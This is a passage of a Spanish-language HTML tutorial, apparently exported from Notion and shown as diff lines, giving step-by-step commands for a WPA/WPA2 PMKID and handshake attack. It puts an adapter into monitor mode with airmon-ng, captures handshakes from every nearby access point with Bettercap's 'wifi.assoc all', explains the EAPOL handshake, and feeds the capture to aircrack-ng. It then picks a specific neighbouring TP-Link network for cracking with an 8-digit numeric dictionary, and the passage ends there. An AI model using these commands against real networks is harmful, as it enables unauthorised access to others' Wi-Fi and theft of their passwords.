+        echo &quot;&#x27;wlan0&#x27; detected!&quot;
+        break
+    fi
+    # Pausa durante 2 segundos antes de verificar nuevamente.
+    sleep 2
+done
+
+# Informa que el adaptador Wi-Fi USB ha sido reconectado exitosamente.
+echo &quot;WiFi USB reconnected successfully.&quot;
+
+# Termina procesos que podrían interferir con el modo monitor.
+sudo airmon-ng check kill
+
+# Pone la interfaz &#x27;wlan0&#x27; en modo monitor.
+sudo airmon-ng start wlan0
+
+# Asegura que la interfaz &#x27;wlan0&#x27; esté activada.
+sudo ifconfig wlan0 up
+</code></pre><p id="1bed9b17-7cd1-8024-bb72-fc6233cc1f18" class="">
+</p><p id="1bed9b17-7cd1-8009-9ffb-f65a078d0404" class="">SI el script se ha ejecutado con éxito, veremos el siguiente mensaje:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-800f-bc8c-dae346bd0448" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">Please disconnect the WiFi USB adapter and reconnect it.
+Press Enter when you are ready...
+
+Waiting for &#x27;wlan0&#x27; to appear...
+&#x27;wlan0&#x27; detected!
+WiFi USB reconnected successfully.
+
+Killing these processes:
+
+    PID Name
+   2571 wpa_supplicant
+
+PHY	Interface	Driver		Chipset
+
+phy1	wlan0		8188eu		TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS]
+		(monitor mode enabled)
+</code></pre><p id="1bed9b17-7cd1-80e3-a5de-ca5186c7f41c" class="">
+</p><h2 id="1bed9b17-7cd1-803a-b191-d3dad1364f71" class="">Comprobaciones</h2><p id="1bed9b17-7cd1-80c5-8d77-f735347c4d44" class="">Realizamos una serie de comprobaciones:</p><p id="1bed9b17-7cd1-809a-8be5-eef1c7d18972" class="">Comando <mark class="highlight-yellow"><strong>airmon-ng </strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80c8-bfc2-d29aedb0e2b4" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">sudo airmon-ng                                         </code></pre><p id="1bed9b17-7cd1-8074-bcdd-f45e23e2750c" class=""><mark class="highlight-yellow"><strong>airmon-ng </strong></mark> es una herramienta de la suite Aircrack-ng diseñada para gestionar interfaces inalámbricas en sistemas Linux. Permite, entre otras cosas, habilitar o deshabilitar el modo monitor en un adaptador Wi-Fi.</p><p id="1bed9b17-7cd1-803f-99f2-da7e49400229" class=""><strong>Propósito de la comprobación:</strong></p><ul id="1bed9b17-7cd1-80eb-a15a-cee70206686d" class="bulleted-list"><li style="list-style-type:disc">Cuando ejecutas sudo airmon-ng sin opciones adicionales, muestra una lista de las interfaces inalámbricas disponibles en tu sistema, junto con detalles como el nombre de la interfaz (por ejemplo, wlan0), el driver y el chipset que utiliza.</li></ul><p id="1bed9b17-7cd1-8019-8a7f-cc45bb56c17a" class=""><strong>Ejemplo de salida:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80bf-8cfb-fc8b089605b9" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">PHY	Interface	Driver		Chipset
+
+phy1	wlan0		8188eu		TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS]</code></pre><p id="1bed9b17-7cd1-8031-81d8-f962d7beb37d" class="">
+</p><p id="1bed9b17-7cd1-803a-9f04-f1b790785f18" class="">Comando<mark class="highlight-yellow"><strong> iwconfig </strong></mark> </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80f0-9b67-cfbcba74edbb" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">iwconfig</code></pre><p id="1bed9b17-7cd1-803c-99f3-ef327f6968d0" class=""><mark class="highlight-yellow"><strong>iwconfig</strong></mark> es una herramienta de línea de comandos en Linux que muestra y configura información sobre interfaces inalámbricas. Es similar a ifconfig, pero está especializada en redes Wi-Fi.</p><p id="1bed9b17-7cd1-800e-bd0e-e94ae57244f2" class=""><strong>Propósito de la comprobación:</strong></p><ul id="1bed9b17-7cd1-805d-8966-d74c124bea0b" class="bulleted-list"><li style="list-style-type:disc">Al ejecutar <mark class="highlight-yellow"><strong>iwconfig</strong></mark> sin opciones, obtienes detalles sobre todas las interfaces inalámbricas del sistema, incluyendo el modo en el que están operando (por ejemplo, Mode:Managed para modo administrado o Mode:Monitor para modo monitor), la frecuencia, el ESSID, la potencia de la señal, etc.</li></ul><ul id="1bed9b17-7cd1-8033-9a14-d8d74aa78ecc" class="bulleted-list"><li style="list-style-type:disc">Se usa específicamente para ver si está en modo monitor.</li></ul><p id="1bed9b17-7cd1-8074-9a8d-c9dcc7d2545d" class=""><strong>Ejemplo de salida:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80ba-acd7-d5516548d486" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wlan0     unassociated  Nickname:&quot;&lt;WIFI@REALTEK&gt;&quot;
+          Mode:Monitor  Frequency=2.457 GHz  Access Point: Not-Associated   
+          Sensitivity:0/0  
+          Retry:off   RTS thr:off   Fragment thr:off
+          Power Management:off
+          Link Quality:0  Signal level:0  Noise level:0
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:0   Missed beacon:0</code></pre><p id="1bed9b17-7cd1-8035-a37d-fe517b82870c" class="">
+</p><p id="1bed9b17-7cd1-8071-a6a2-e30c02238a37" class="">Comando<mark class="highlight-yellow"><strong> sudo ip link show</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-803c-99fb-c6f4d798031c" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">sudo ip link show </code></pre><p id="1bed9b17-7cd1-8077-99fc-eb6695ea3645" class="">Si estás usando herramientas como <strong>Bettercap</strong> o realizando auditorías de redes Wi-Fi, necesitas que la interfaz esté activa para capturar tráfico.Si acabas de configurar una interfaz (por ejemplo, con airmon-ng start wlan0 para modo monitor), verificar con <mark class="highlight-yellow"><strong>sudo ip link show</strong></mark> te asegura que todo está listo.</p><ul id="1bed9b17-7cd1-8079-a38f-c9039b5202f8" class="bulleted-list"><li style="list-style-type:disc">Si estás usando herramientas como <strong>Bettercap</strong> o realizando auditorías de redes Wi-Fi, necesitas que la interfaz (normalmente en modo monitor, como wlan0mon) esté activa para capturar tráfico.</li></ul><p id="1bed9b17-7cd1-809a-bddd-f3776ea30b6b" class=""><strong>Ejemplo de salida:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80b9-b981-c21a2866626f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">6: wlan0: &lt;BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP&gt; mtu 2312 qdisc mq state UP mode DEFAULT group default qlen 1000
+    link/ieee802.11/radiotap 32:8a:d2:98:79:66 brd ff:ff:ff:ff:ff:ff permaddr d8:44:89:91:92:0d
+</code></pre><p id="1bed9b17-7cd1-80ec-bbc3-f97c720b7b47" class="">
+</p><h1 id="1bed9b17-7cd1-80d3-9b2c-cb2d08531518" class="">Bettercap - Captura del handshake</h1><h3 id="1bed9b17-7cd1-80c2-813f-fb9bd1207058" class="">¿Qué hace Bettercap en este ataque?</h3><p id="1bed9b17-7cd1-80f6-b8d0-dd3f0f3250a6" class="">Bettercap es una herramienta de seguridad de redes versátil que se utiliza para realizar auditorías y ataques, incluyendo operaciones contra redes Wi-Fi. En el contexto del <mark class="highlight-blue"><strong>ataque PMKID,</strong></mark> Bettercap desempeña las siguientes funciones:</p><ul id="1bed9b17-7cd1-8037-b4bb-df98af581851" class="bulleted-list"><li style="list-style-type:disc"><strong>Modo monitor</strong>: Configura la interfaz Wi-Fi en modo monitor para capturar tráfico inalámbrico.</li></ul><ul id="1bed9b17-7cd1-804d-8dde-c0e986dc518a" class="bulleted-list"><li style="list-style-type:disc"><strong>Escaneo de redes</strong>: Detecta puntos de acceso y clientes cercanos.</li></ul><ul id="1bed9b17-7cd1-804f-8cb1-d550ce50c99a" class="bulleted-list"><li style="list-style-type:disc"><strong>Solicitudes de asociación</strong>: Envía solicitudes de asociación a los puntos de acceso para provocar que respondan con paquetes que contengan el PMKID.</li></ul><ul id="1bed9b17-7cd1-8089-b428-cbacefdd7e2a" class="bulleted-list"><li style="list-style-type:disc"><strong>Captura y almacenamiento</strong>: Guarda los PMKID capturados en un archivo para su análisis posterior.</li></ul><p id="1bed9b17-7cd1-8036-ad1f-ea5c60c50b2c" class="">En esencia, Bettercap simplifica y automatiza el proceso de escaneo, asociación y captura del PMKID, haciendo que el ataque sea más accesible y eficiente.</p><h3 id="1bed9b17-7cd1-807a-9020-e8a0f3df76db" class="">Pasos</h3><p id="1bed9b17-7cd1-802b-8929-df605741dd90" class="">Iniciamos Bettercap y especificamos la interfaz de red que se va a utilizar.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80c4-a849-e0c886699900" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">sudo bettercap -iface wlan0 </code></pre><p id="1bed9b17-7cd1-80e8-89f1-c348bfabf996" class=""><mark class="highlight-yellow"><strong>-iface wlan0</strong></mark>: Indica que la interfaz wlan0 (tu adaptador Wi-Fi) será utilizada para las operaciones.</p><p id="1bed9b17-7cd1-80dc-b399-d0b48e28c90c" class="">
+</p><p id="1bed9b17-7cd1-8044-afc6-f8dffee94802" class="">Dentro de bettercap:</p><figure id="1bed9b17-7cd1-80d1-a3cc-e3693b5607fa" class="image"><a href="wifi_attack_resources/image%201.png"><img style="width:709.90625px" src="wifi_attack_resources/image%201.png"/></a></figure><p id="1bed9b17-7cd1-8056-9225-e4324529b767" class="">
+</p><ol type="1" id="1bed9b17-7cd1-802a-9f6a-c3b29e7c2dc1" class="numbered-list" start="1"><li>Activar el modo de reconocimiento para escanear redes Wi-Fi cercanas.</li></ol><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-8040-9bb8-e15da9a17c41" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">wifi.recon on</code></pre><p id="1bed9b17-7cd1-802c-bb50-d9e18f3097d0" class=""><mark class="highlight-yellow"><strong>wifi.recon: </strong></mark>Es el módulo de Bettercap encargado de escanear redes inalámbricas. Bettercap comienza a buscar redes Wi-Fi en el entorno, recopilando información sobre puntos de acceso y clientes.</p><p id="1bed9b17-7cd1-8005-be17-c6bed1c41779" class="">
+</p><ol type="1" id="1bed9b17-7cd1-8091-b611-f4c03050c35f" class="numbered-list" start="2"><li>Mostrar una lista de las redes Wi-Fi detectadas durante el escaneo.</li></ol><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80a3-91c2-f7529d1bd272" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">wifi.show</code></pre><p id="1bed9b17-7cd1-8054-a834-d2025579fcff" class=""><mark class="highlight-yellow"><strong>wifi.show:</strong></mark> Comando que presenta en pantalla los datos recopilados por el módulo</p><p id="1bed9b17-7cd1-8076-958d-e290c3d6b179" class="">Obtenemos una tabla con detalles como el BSSID (dirección MAC del AP), SSID (nombre de la red), canal, tipo de cifrado, etc. Esto te ayuda a identificar la red objetivo.</p><figure id="1bed9b17-7cd1-808d-9b48-e4085ed7805c" class="image"><a href="wifi_attack_resources/image.jpg"><img style="width:709.96875px" src="wifi_attack_resources/image.jpg"/></a></figure><p id="1bed9b17-7cd1-8085-823d-cf7ca13379e8" class="">
+</p><ol type="1" id="1bed9b17-7cd1-8037-a185-f522253046ac" class="numbered-list" start="3"><li>Intentar asociarse con todos los puntos de acceso detectados para capturar sus PMKID.</li></ol><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80a6-b324-d8837a949c4a" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">wifi.assoc all</code></pre><ul id="1bed9b17-7cd1-8088-b0ae-d3ac0949a3c9" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>wifi.assoc</strong></mark>: Envía solicitudes de asociación a los puntos de acceso.</li></ul><ul id="1bed9b17-7cd1-8094-83c3-c82b75d2b125" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow"><strong>all:</strong></mark> Indica que el comando se aplicará a todos los AP visibles.</li></ul><p id="1bed9b17-7cd1-8048-8ca2-f8ed72ac8333" class="">Bettercap envía solicitudes a cada punto de acceso, intentando obtener el PMKID. Si tiene éxito, los PMKID capturados se almacenan para su uso posterior.</p><figure id="1bed9b17-7cd1-80fe-8bab-f2cc9b2d6ae7" class="image"><a href="wifi_attack_resources/image%202.png"><img style="width:709.953125px" src="wifi_attack_resources/image%202.png"/></a></figure><p id="1bed9b17-7cd1-802b-9339-c57d1f8cc4d3" class="">Vemos que la captura de red se nos guarda en <mark class="highlight-blue"><strong>/root/bettercap-wifi-handshakes.pcap</strong></mark></p><p id="1bed9b17-7cd1-80ca-8298-fc3a3a00f4e4" class="">
+</p><h1 id="1bed9b17-7cd1-806c-81b6-e20ee77c24f1" class="">Explicacion captura tráfico de red pcap</h1><p id="1bed9b17-7cd1-8052-95eb-cfd28e8d8fa6" class="">Al abrir la captura obenida con bettercap, y al filtrar por protocolo <mark class="highlight-blue"><strong>EAPOL</strong></mark> <strong>(Extensible Authentication Protocol over LAN)</strong>, vemos es el siguiente resultado:</p><figure id="1bed9b17-7cd1-8085-9fff-ff3ac64038ed" class="image"><a href="wifi_attack_resources/image%203.png"><img style="width:709.984375px" src="wifi_attack_resources/image%203.png"/></a></figure><p id="1bed9b17-7cd1-80d5-b24c-dac04c5ad824" class="">El protocolo <strong>EAPOL (Extensible Authentication Protocol over LAN)</strong>, que forma parte del estándar 802.1X y se utiliza en redes WPA/WPA2 para establecer conexiones seguras mediante el <strong>4-way handshake</strong>. Además, hay paquetes con el protocolo <strong>MXCHIPInform</strong>, que parece ser un protocolo propietario de dispositivos IoT fabricados por MXCHIP, una empresa conocida por módulos Wi-Fi e IoT. Este tráfico refleja intentos de conexión de dispositivos como un Xiaomi y otros clientes a la red.</p><p id="1bed9b17-7cd1-80a9-ae0e-d803c8cad256" class="">
+</p><h3 id="1bed9b17-7cd1-80fe-8780-c22f29c6f7ac" class="">Paquetes EAPOL - El 4-way Handshake</h3><p id="1bed9b17-7cd1-8044-a6d5-eb5d747dba92" class="">La mayor parte del tráfico en el .pcap corresponde al <strong>4-way handshake</strong> de WPA/WPA2, un proceso de cuatro pasos que permite al punto de acceso (TP-Link) y los dispositivos clientes acordar claves de cifrado seguras para la comunicación. Este handshake incluye cuatro mensajes clave:</p><ul id="1bed9b17-7cd1-8095-b48d-c91e8cde13fb" class="bulleted-list"><li style="list-style-type:disc"><strong>Mensaje 1 de 4</strong>: Enviado por el punto de acceso al cliente. Contiene el <strong>ANonce</strong> (un valor aleatorio generado por el autenticador) para iniciar el proceso de generación de claves.</li></ul><ul id="1bed9b17-7cd1-8054-9797-f122c653be0b" class="bulleted-list"><li style="list-style-type:disc"><strong>Mensaje 2 de 4</strong>: Enviado por el cliente al punto de acceso. Incluye el <strong>SNonce</strong> (un valor aleatorio del cliente) y un <strong>MIC</strong> (Message Integrity Code) para verificar la integridad del mensaje.</li></ul><ul id="1bed9b17-7cd1-8079-92ff-ca49971c0f0a" class="bulleted-list"><li style="list-style-type:disc"><strong>Mensaje 3 de 4</strong>: Enviado por el punto de acceso al cliente. Confirma la instalación de la <strong>PTK</strong> (Pairwise Transient Key, clave temporal para la comunicación entre el punto de acceso y el cliente) y la <strong>GTK</strong> (Group Temporal Key, clave para tráfico multicast).</li></ul><ul id="1bed9b17-7cd1-8079-8c2d-cace1d70515e" class="bulleted-list"><li style="list-style-type:disc"><strong>Mensaje 4 de 4</strong>: Enviado por el cliente al punto de acceso. Confirma que el handshake se ha completado y las claves están instaladas.</li></ul><p id="1bed9b17-7cd1-8068-83a1-c503f50d5dbd" class="">
+</p><h3 id="1bed9b17-7cd1-803e-a9f0-fdd75fe3e55d" class="">Proceso de Autenticación Wi-Fi (EAPOL)</h3><p id="1bed9b17-7cd1-8033-b99a-d5798cda2e80" class="">El tráfico <mark class="highlight-default"><strong>EAPOL</strong></mark> muestra que varios dispositivos están intentando conectarse a una red Wi-Fi gestionada por el TP-Link. Cada intento de conexión genera un 4-way handshake:</p><ol type="1" id="1bed9b17-7cd1-80e4-95f4-f3c34df047e8" class="numbered-list" start="1"><li>El TP-Link envía el <strong>Mensaje 1</strong> con el ANonce (paquetes 511-549).</li></ol><ol type="1" id="1bed9b17-7cd1-80dc-8f6b-d011684136f1" class="numbered-list" start="2"><li>El cliente responde con el <strong>Mensaje 2</strong>, enviando su SNonce y MIC (paquetes 551 y 500).</li></ol><ol type="1" id="1bed9b17-7cd1-805f-b818-cfc5f2a14f4e" class="numbered-list" start="3"><li>El TP-Link envía el <strong>Mensaje 3</strong>, confirmando las claves PTK y GTK (paquetes 547 y 503).</li></ol><ol type="1" id="1bed9b17-7cd1-802b-ad01-c102aa49a088" class="numbered-list" start="4"><li>El cliente finaliza con el <strong>Mensaje 4</strong>, confirmando el éxito (paquete 512).</li></ol><p id="1bed9b17-7cd1-801a-adac-d9076227edc9" class="">
+</p><h3 id="1bed9b17-7cd1-80b8-8a52-c412aa15b53c" class="">¿Qué es la contraseña y cómo se usa en WPA/WPA2?</h3><p id="1bed9b17-7cd1-807a-be5f-de5d4ecd21d9" class="">La contraseña de la red Wi-Fi (también conocida como <strong>PSK</strong>, Pre-Shared Key, en WPA-Personal) se utiliza para derivar una clave maestra llamada <strong>PMK</strong> (Pairwise Master Key). La PMK se genera a partir de:</p><ul id="1bed9b17-7cd1-8053-b8f7-cbb5b764ac8a" class="bulleted-list"><li style="list-style-type:disc">La contraseña (PSK).</li></ul><ul id="1bed9b17-7cd1-802d-936f-eb230b8065a3" class="bulleted-list"><li style="list-style-type:disc">El nombre de la red (ESSID).</li></ul><ul id="1bed9b17-7cd1-80db-a1e5-e16f7d5023a2" class="bulleted-list"><li style="list-style-type:disc">Un proceso de derivación usando el algoritmo <strong>PBKDF2</strong> (Password-Based Key Derivation Function 2), que aplica 4096 iteraciones de HMAC-SHA1 para hacer que el proceso sea más seguro.</li></ul><p id="1bed9b17-7cd1-80dc-aa54-cd78a1fe8c6f" class="">La PMK, junto con el ANonce, SNonce y las direcciones MAC del AP y el cliente, se usa para generar la <strong>PTK</strong> (Pairwise Transient Key), que es la clave temporal que cifra la comunicación entre el cliente y el AP.</p><h3 id="1bed9b17-7cd1-80a6-b4c6-d9dc619e6936" class="">Handshake capturado</h3><p id="1bed9b17-7cd1-807f-9980-f4d3ca076336" class="">Si conseguimos capturado un handshake, este aparecerá en el archivo /root/bettercap-wifi-handshakes.pcap. Este handshake contendrá:</p><ul id="1bed9b17-7cd1-8007-96d7-ff1b51f71d19" class="bulleted-list"><li style="list-style-type:disc">El ANonce y SNonce.</li></ul><ul id="1bed9b17-7cd1-8045-87db-ffd1b0977b9a" class="bulleted-list"><li style="list-style-type:disc">El MIC (Message Integrity Code) del Mensaje 2.</li></ul><ul id="1bed9b17-7cd1-802f-a059-c7cb783cb288" class="bulleted-list"><li style="list-style-type:disc">Las direcciones MAC del AP y el cliente.</li></ul><ul id="1bed9b17-7cd1-8059-8392-ef9a2585fa12" class="bulleted-list"><li style="list-style-type:disc">El ESSID.</li></ul><p id="1bed9b17-7cd1-80d2-b75c-facfc56d0ebd" class="">Estos datos son suficientes para que aircrack-ng intente descifrar la contraseña.</p><h1 id="1bed9b17-7cd1-8073-8f49-defba5e50030" class="">aircrack-ng - Descifrado de la contraseña</h1><h2 id="1bed9b17-7cd1-80ec-8874-cd8511f71749" class="">Explicación</h2><p id="1bed9b17-7cd1-8002-b439-f219e0756e54" class=""><mark class="highlight-yellow"><strong>aircrack-ng</strong></mark>: Es una herramienta diseñada para analizar archivos de captura de tráfico Wi-Fi (como archivos .pcap) y buscar información útil, como handshakes WPA/WPA2 o PMKID, que son necesarios para intentar descifrar contraseñas de redes Wi-Fi.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80c5-bec1-e427e35dd7a5" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">sudo aircrack-ng /root/bettercap-wifi-handshakes.pcap</code></pre><p id="1bed9b17-7cd1-80fc-ab8a-ce02c7423c21" class="">Cuando ejecutamos este comando, <mark class="highlight-yellow"><strong>aircrack-ng</strong></mark> examina el archivo .pcap y muestra una lista de redes Wi-Fi detectadas, junto con detalles sobre si se capturó un handshake completo o un PMKID para cada una. Estos elementos son esenciales para intentar descifrar la contraseña mediante un ataque de fuerza bruta o con un diccionario.</p><figure id="1bed9b17-7cd1-80ea-8ec9-d53ce7f2e120" class="image"><a href="wifi_attack_resources/image%204.png"><img style="width:709.953125px" src="wifi_attack_resources/image%204.png"/></a></figure><ul id="1bed9b17-7cd1-8071-add1-ec556b708043" class="bulleted-list"><li style="list-style-type:disc">La red número <strong>6</strong> (TP-Link_9A88) tiene <strong>1 handshake</strong> capturado, lo que la hace ideal para intentar descifrar su contraseña.</li></ul><ul id="1bed9b17-7cd1-80d3-9614-e1e7bbc0e39d" class="bulleted-list"><li style="list-style-type:disc">Varias redes tienen <strong>PMKID</strong> capturados, pero no handshakes completos. También se podría trabajar con estas, pero el handshake de la red 6 es el más prometedor por ahora.</li></ul><h2 id="1bed9b17-7cd1-80dd-ac1b-dc60efe6ad76" class="">Proceso para sacar contraseña</h2><p id="1bed9b17-7cd1-80d9-a434-e54286a2c6f9" class="">Se requerirá de un<strong> diccionario de contraseñas</strong>, un archivo de texto con una lista de posibles contraseñas (una por línea).</p><p id="1bed9b17-7cd1-80d6-b8ef-fe0bf7abb09a" class="">Dado que el punto de acceso objetivo es un router <strong>TP-Link</strong>, y según la información disponible, los routers TP-Link suelen venir con una contraseña Wi-Fi por defecto de 8 dígitos numéricos (impresa en la etiqueta del dispositivo), se procederá a generar un diccionario con todas las combinaciones posibles de 8 dígitos (de 00000000 a 99999999). Este diccionario se utilizará con aircrack-ng para 